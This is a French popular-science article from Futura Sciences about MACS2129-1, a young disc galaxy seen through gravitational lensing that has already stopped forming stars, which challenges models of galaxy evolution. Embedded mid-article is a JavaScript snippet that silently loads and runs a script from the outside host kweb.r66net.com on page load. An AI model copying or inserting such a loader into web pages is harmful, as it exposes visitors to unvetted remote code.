{"title": "Hubble découvre une galaxie morte trop tôt et qui défie l'astrophysique", "newspaper": "Futura Sciences", "author": "Laurent Sacco", "date_publi": "28/06/2017", "content": "Les galaxies en forme de disque sont connues pour être des lieux de formation d'étoiles au contraire des galaxies elliptiques dominées par une population d'étoiles âgées et dont les réserves de gaz sont épuisées. Pourtant, au grand étonnement des astronomes, une jeune galaxie en forme de disque a un contenu similaire à celui d'une vieille galaxie elliptique. Une observation réalisée par Hubble qui ne cadre pas avec les modèles astrophysiques classiques de l'évolution des galaxies. Ce qu'il faut retenir Dans le cadre du modèle cosmologique standard, les jeunes galaxies spirales se forment les premières et grandissent, au moins en partie, par fusions successives en donnant de grandes galaxies comme la Voie lactée. Des milliards d'années plus tard, elles vont à leur tour fusionner pour donner des galaxies elliptiques pauvres en gaz. La formation stellaire s'arrête. Pourtant, bien qu'en forme de disque et âgée de seulement 3 milliards d'années, MACS2129-1 se comporte comme une galaxie elliptique massive morte et âgée. L'astrophysique de l'évolution des galaxies n'est donc pas encore correctement comprise et le rôle des trous noirs supermassifs pourrait être plus important que prévu. Il y a un peu moins d'un siècle,  Edwin Hubble  et quelques-uns de ses collègues nous ont ouvert les  portes  d'un nouveau territoire, celui du royaume des  nébuleuses . Nous avons fait des progrès très significatifs dans son exploration mais force est de constater que le monde des  galaxies  et des  amas de galaxies  contient encore bien des zones d'ombres. À commencer par celles qui sont du ressort des énigmes de la  matière noire  et de l' énergie noire . Hubble avait en son temps proposé une classification des galaxies. Certains, mais pas lui, y voyaient les indices d'une évolution de ces structures cosmiques qui peuvent contenir des milliards d' étoiles . En gros, trois grands types pouvaient être distingués : celles en forme de disque (qui peuvent contenir ou non des bras spiraux et qui sont lenticulaires ou spirales), les elliptiques et les irrégulières. Les astronomes ont d'abord cru que les galaxies débutaient leur vie sous forme  elliptique  pour ensuite devenir des spirales. Mais au fur et à mesure que leurs caractéristiques ont été mieux comprises et que les images de ces  astres  sont devenues plus nombreuses et mieux résolues, cette interprétation a été renversée. En effet, il est apparu que les  galaxies elliptiques  sont pauvres en  gaz  et en poussières et se composent généralement d'étoiles âgées. Les spirales en sont quant à elles beaucoup plus pourvues et présentent un mélange de population d'étoiles jeunes et âgées. Les images des  galaxies irrégulières  ont révélé qu'elles étaient, parfois, clairement associées à des collisions de galaxies en cours, avec des  forces de marée  démantelant les étoiles sous forme d'arches de matière et de courants stellaires. De plus, les galaxies irrégulières sont assez riches en gaz, poussière et étoiles jeunes. Il fut donc proposé que les galaxies elliptiques soient en réalité le produit final des collisions avec  fusions  de nombreuses  galaxies spirales , qui seraient nées les premières. À chacune de ces  coalescences , des flambées d'étoiles se produisent. Celles-ci consomment le gaz présent dans les galaxies jusqu'à ce qu'il n'en reste plus assez pour générer un nombre significatif de nouvelles étoiles. Image de l'amas massif de galaxies jouant l'effet d'un télescope naturel. La galaxie distante \"morte\", de couleur rouge, est encadrée par un rectangle. © Nasa, ESA, S. Toft ( University of Copenhagen ), M. Postman (STScI), the CLASH team, Insu                               Une jeune galaxie de 3 milliards d'années déjà morte Or, voilà que des observations menées par une équipe internationale d'astronomes, dont certains sont membres de l'Irap, l'Institut de recherche en astrophysique et planétologie à Toulouse, et du Cral, le Centre de recherche astrophysique de Lyon, viennent compliquer ce schéma, comme en témoigne un article disponible sur  arXiv .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les chercheurs se sont concentrés sur le cas de MACS2129-1, une galaxie lointaine dont des observations par effet de  lentille gravitationnelle  avaient été effectuées grâce au  télescope Hubble  dans le cadre du  Cluster  Lensing And  Supernova  survey with Hubble  (CLASH). Il a été possible d'en déduire des estimations concernant les  masses  des étoiles de cette galaxie ainsi que leurs âges et leur taux de formation. En les complétant par celles fournies par le  VLT  de l' ESO  en ce qui concerne les  vitesses  des étoiles, on obtient une image surprenante. Mieux résolue, elle montre que l'on est en présence d'une galaxie « morte » avec de relatives vieilles étoiles. Il ne s'en forme plus de nouvelles et sa rotation est presque deux fois plus rapide que celle de la  Voie lactée , tout en étant trois fois plus massive. S'agit-il d'une galaxie elliptique ? Pas du tout. On est en présence d'un disque sans bras spiraux, deux fois plus petit que notre galaxie, et dont la formation stellaire s'est arrêtée, faute de gaz, seulement quelques milliards d'années après le  Big Bang . En fait, MACS2129-1 est observée alors que le cosmos n'était âgé que de trois milliards d'années. Cette jeune et massive galaxie est donc déjà morte avec son contenu similaire à celui d'une vieille galaxie elliptique. Dans le cadre du  modèle standard  de l'évolution des galaxies en astrophysique, les chercheurs ont du mal à rendre compte de l'existence d'un pareil objet. Il y a, néanmoins, au moins une piste de recherche. On sait que les  trous noirs supermassifs  au centre des galaxies peuvent produire un souffle de rayonnement particulièrement puissant quand ils fonctionnent comme des  quasars . Peut-être que celui qui doit se trouver au sein de MACS2129-1 a-t-il été tellement actif qu'il a éjecté tout le gaz disponible rapidement, entrainant ainsi la mort prématurée de cette jeune galaxie. En tout état de cause, cette découverte  « bouleverse notre compréhension de la formation et de l'évolution des galaxies massives. En effet, l' univers  à cette époque était rempli de gaz et était au maximum de son histoire de formation stellaire »  écrit le CNRS dans son communiqué. Les collisions de galaxies dans l’univers                       Les collisions de galaxies ne sont pas rares dans l’univers. C’est même l’un des processus de croissance des galaxies. Ainsi, dans quelques milliards d’années, la Voie lactée entrera en collision avec celle d’Andromède. Cette vidéo provient du projet Du Big Bang au vivant, qui regroupe une dizaine de scientifiques. © Groupe ECP, www.dubigbangauvivant.com                                       "}